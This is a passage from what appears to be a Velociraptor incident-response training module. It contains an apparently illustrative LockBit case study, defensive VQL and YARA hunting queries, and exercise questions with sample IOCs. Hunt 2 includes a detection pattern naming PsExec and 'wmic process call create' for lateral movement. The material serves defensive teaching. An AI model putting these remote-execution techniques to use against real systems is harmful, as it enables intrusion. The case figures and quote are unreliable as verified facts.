select(.SuspiciousProcesses != null) | .SuspiciousProcesses[]'\n```"
      }
    },
    {
      "type": "real_world",
      "content": {
        "text": "# Real-World Case Study: Velociraptor in Ransomware Response\n\n## The Incident: LockBit 3.0 Ransomware at Manufacturing Company\n\n**Company**: MidSize Manufacturing Inc. (2,500 employees, 3,000 endpoints)\n**Date**: October 2023\n**Impact**: 50+ servers encrypted, production halted\n\n### Timeline\n\n**Day 1 - 02:15 AM**: Ransomware detonates\n- Multiple servers display LockBit ransom notes\n- File shares encrypted\n- Backups targeted and corrupted\n\n**Day 1 - 06:00 AM**: IR team arrives on-site\n- **Challenge**: Need to identify patient zero, lateral movement path, and all compromised systems\n- **Traditional approach**: Image 50+ endpoints manually (3-5 days)\n- **Velociraptor approach**: Deploy and hunt in hours\n\n### Velociraptor Deployment\n\n**06:30 AM**: IR team deploys Velociraptor server on isolated IR network\n\n```bash\n# Deploy server on isolated laptop\n./velociraptor config generate -i\n./velociraptor --config server.config.yaml frontend -v\n```\n\n**07:00 AM**: Create offline collector for air-gapped systems\n\n```bash\n# Create collector with key artifacts\n./velociraptor --config server.config.yaml collector create \\\n--artifacts Windows.EventLogs.EvtxHunter \\\n--artifacts Windows.Forensics.Timeline \\\n--artifacts Windows.KapeFiles.Targets \\\n--artifacts Windows.Detection.Yara \\\n--output lockbit_collector.exe\n```\n\n**07:30 AM**: Deploy collectors via USB to 50 priority systems\n- USB distribution to IT staff\n- Run collectors, collect ZIP outputs\n- Import ZIPs into Velociraptor server\n\n### Investigation with Velociraptor\n\n#### Hunt 1: Find Patient Zero\n\n**Artifact**: `Windows.EventLogs.EvtxHunter`\n\n```sql\n-- Search for initial access indicators\nSELECT System.TimeCreated.SystemTime AS EventTime,\nSystem.Computer AS Hostname,\nEventData.TargetUserName AS User,\nEventData.IpAddress AS SourceIP\nFROM parse_evtx(filename='C:/Windows/System32/winevt/logs/Security.evtx')\nWHERE System.EventID.Value = 4624  -- Successful logon\nAND EventData.LogonType = 10      -- RemoteInteractive (RDP)\nAND System.TimeCreated.SystemTime > '2023-10-20T00:00:00Z'\nAND System.TimeCreated.SystemTime < '2023-10-21T03:00:00Z'\nORDER BY EventTime\n```\n\n**Finding**: Suspicious RDP login from external IP to accounting workstation at 01:45 AM\n\n#### Hunt 2: Track Lateral Movement\n\n**Artifact**: `Windows.EventLogs.LateralMovement`\n\n```sql\n-- Detect PsExec and WMIC usage\nSELECT EventTime, Hostname, EventID, User, TargetHost, Command\nFROM parse_evtx(filename='C:/Windows/System32/winevt/logs/Security.evtx')\nWHERE EventID IN (4688, 4689)  -- Process creation/termination\nAND (Command =~ 'psexec' OR Command =~ 'wmic.*process call create')\nAND EventTime > '2023-10-21T01:45:00Z'\n```\n\n**Finding**: Attacker used PsExec to spread from accounting workstation to 12 servers between 01:50 AM - 02:10 AM\n\n#### Hunt 3: Identify Persistence Mechanisms\n\n**Artifact**: `Windows.Sysinternals.Autoruns`\n\n```sql\nSELECT Hostname, Category, Entry, ImagePath, LaunchString,\ntimestamp(epoch=Modified) AS ModifiedTime\nFROM Artifact.Windows.Sysinternals.Autoruns()\nWHERE ModifiedTime > '2023-10-20T00:00:00Z'\nORDER BY ModifiedTime DESC\n```\n\n**Finding**: Malicious scheduled task created on domain controller at 02:00 AM\n\n#### Hunt 4: Extract Ransomware Binaries\n\n**Artifact**: `Windows.Detection.Yara`\n\n```sql\nLET LockBitRule = '''\nrule LockBit3 {\nstrings:\n$s1 = \"LockBit 3.0\" ascii\n$s2 = \".lockbit\" ascii\n$s3 = \"YOUR FILES ARE ENCRYPTED\" wide\ncondition:\n2 of them\n}\n'''\n\nSELECT Hostname, FullPath, Size, Rule, Strings\nFROM Artifact.Windows.Detection.Yara(\nYaraRule=LockBitRule,\nPathGlob='C:/**/*.exe'\n)\n```\n\n**Finding**: LockBit binary located in 15 different paths across compromised systems\n\n### Results\n\n**Day 1 - 4:00 PM** (10 hours after IR arrival):\n\n✅ **Patient Zero Identified**: Accounting workstation (compromised via stolen VPN creds)\n✅ **Attack Path Mapped**: Clear lateral movement timeline across 50+ systems\n✅ **Persistence Removed**: Malicious scheduled tasks and registry keys cleaned\n✅ **Containment Complete**: All compromised systems isolated\n✅ **IOCs Extracted**: 27 unique file hashes, 8 IP addresses, 3 domain names\n\n**Traditional Forensics Estimate**: 3-5 days for the same analysis\n\n**Velociraptor Advantage**: 10 hours (70% faster)\n\n### Lessons Learned\n\n1. **Pre-Deploy Velociraptor**: Having it ready in IR toolkit saved 2+ hours\n2. **Offline Collectors**: Critical for air-gapped/isolated networks\n3. **Custom Artifacts**: Pre-built ransomware hunting artifacts accelerated investigation\n4. **Scale Matters**: Investigating 3,000 endpoints simultaneously would be impossible manually\n5. **Evidence Preservation**: All collected data preserved in forensically sound manner\n\n### IR Team Quote\n\n> \"Velociraptor turned what would have been a week-long forensic nightmare into a single-day investigation. We had complete visibility across every endpoint within hours. This tool is now a permanent part of our IR toolkit.\" \n> \n> — Lead IR Analyst, MidSize Manufacturing Inc."
      }
    },
    {
      "type": "reflection",
      "content": {
        "text": "# Reflection Questions: Test Your Velociraptor Mastery\n\n## Question 1: Architecture Understanding\n\nYou're deploying Velociraptor in a Fortune 500 company with:\n- 25,000 endpoints across 50 global offices\n- Air-gapped OT network with 500 ICS/SCADA systems\n- Compliance requirement for audit logging\n\n**How would you architect your Velociraptor deployment?**\n\nConsider:\n- Server placement and redundancy\n- Agent vs. offline collector strategy\n- Network segmentation and isolation\n- Data retention and compliance\n\n*(Take 5 minutes to sketch out your architecture)*\n\n---\n\n## Question 2: VQL Query Design\n\nYou need to hunt for **Cobalt Strike Beacon** across your environment. You know:\n- Beacons often inject into legitimate processes\n- They use named pipes for communication (pattern: `\\msagent_*`)\n- They create network connections to C2 servers\n\n**Write a VQL query that detects these indicators.**\n\n*(Try writing the query before looking at sample artifacts)*\n\n---\n\n## Question 3: Incident Response Scenario\n\nAt 3 AM, your SIEM alerts on suspicious PowerShell execution across 200 endpoints. You have Velociraptor deployed.\n\n**What artifacts would you collect immediately? In what order?**\n\nPrioritize:\n1. Triage (quick wins)\n2. Evidence preservation\n3. Comprehensive collection\n\n*(List at least 5 artifacts and justify your priorities)*\n\n---\n\n## Question 4: Custom Artifact Creation\n\nYour threat intelligence team provides IOCs for a new APT campaign:\n- Suspicious registry key: `HKLM\\SOFTWARE\\Microsoft\\Network\\Debug`\n- Malicious service name pattern: `WinDefend*` (typosquatting)\n- C2 domains: `update-service[.]com`, `windows-cdn[.]net`\n\n**Create a custom artifact YAML that hunts for these IOCs.**\n\n*(Write the complete artifact structure)*\n\n---\n\n## Question 5: Forensic Analysis\n\nYou collect `Windows.Forensics.Timeline` artifact from a compromised system. The timeline shows:\n- 02:15 AM: `evil.exe` created in `C:\\Windows\\Temp\\`\n- 02:16 AM: Registry key modified in `HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run`\n- 02:17 AM: Network connection to `185.220.101.50:443`\n- 02:18 AM: 50+ files encrypted in `C:\\Users\\victim\\Documents\\`\n\n**Based on this timeline, what happened? What's your next investigative step?**\n\n*(Analyze the attack flow and recommend 2-3 follow-up artifacts to collect)*\n\n---\n\n## Bonus Challenge: Scale Testing\n\nYou need to hunt for a specific file hash (`SHA256: abc123...`) across 50,000 endpoints.\n\n**Which approach is more efficient? Why?**\n\nA) Use `Windows.Collectors.File` artifact with hash matching\nB) Use `Generic.Forensics.SQLiteHunter` to search hash databases\nC) Use custom VQL with `hash()` function on all files\nD) Use YARA rule with `hash.sha256` condition\n\n*(Explain your reasoning and estimate collection time)*\n\n---\n\n**Reflection Goal**: These questions test whether you can **apply** Velociraptor knowledge, not just recall facts. True mastery comes from hands-on practice and critical thinking."
      }
    },
    {
      "type": "mindset_coach",
      "content": {
        "text": "# 🎯 You've Leveled Up: From Velociraptor Novice to Hunter\n\n## What You've Accomplished\n\nLet's pause and recognize what you've learned:\n\n✅ **Architecture Mastery**: You understand server-client deployment, offline collectors, and scaling strategies\n\n✅ **VQL Fluency**: You can write custom queries using SELECT-FROM-WHERE-ORDER and leverage plugins\n\n✅ **Artifact Creation**: You can build custom YAML artifacts for specific investigations\n\n✅ **Hunting at Scale**: You understand how to investigate 10,000+ endpoints simultaneously\n\n✅ **Real-World Application**: You've seen Velociraptor accelerate ransomware response from days to hours\n\n**That's NOT beginner knowledge. That's practitioner-level expertise.**\n\n## The Jim Kwik Learning Loop\n\n**Remember Jim Kwik's principle**: \"Knowledge is NOT power. Knowledge is only POTENTIAL power. Action is power.\"\n\nHere's your action plan:\n\n### Week 1: Lab Setup\n- Deploy Velociraptor server (15 minutes)\n- Connect 2-3 test VMs as clients\n- Run 5 pre-built artifacts\n- Read the VQL outputs\n\n### Week 2: Query Writing\n- Modify 3 existing artifacts\n- Write 1 custom VQL query\n- Test on your lab endpoints\n- Break it, fix it, learn from errors\n\n### Week 3: Hunt Building\n- Create 1 custom artifact from scratch\n- Launch a hunt across all lab endpoints\n- Analyze results in Notebooks\n- Document findings\n\n### Week 4: Share Knowledge\n- Teach a colleague how Velociraptor works\n- Present one use case to your team\n- Contribute an artifact to the community\n\n**Why teaching matters**: When you teach Velociraptor to someone else, you'll discover gaps in your own understanding. Fill those gaps, and you'll achieve true mastery.\n\n## Your Velociraptor Journey Ahead\n\n**Level 1 (Operator)**: Run pre-built artifacts ✅ *You're here*\n\n**Level 2 (Hunter)**: Modify artifacts, write simple VQL ← *Next milestone*\n\n**Level 3 (Engineer)**: Create custom artifacts, automate hunts\n\n**Level 4 (Architect)**: Design enterprise deployments, optimize performance\n\n**Level 5 (Contributor)**: Contribute to Velociraptor project, speak at conferences\n\n## Final Thoughts\n\nVelociraptor is more than a tool - it's a **mindset shift** in how we approach digital forensics.\n\n**Old Way**: Image one system at a time, analyze offline, weeks per investigation\n\n**Velociraptor Way**: Query thousands of live endpoints, analyze in real-time, hours per investigation\n\nYou now have a superpower that most cybersecurity professionals don't have. The question is:\n\n**What will you hunt for first?**\n\nGo forth and detect evil at scale. 🦖🔍"
      }
    }
  ]
}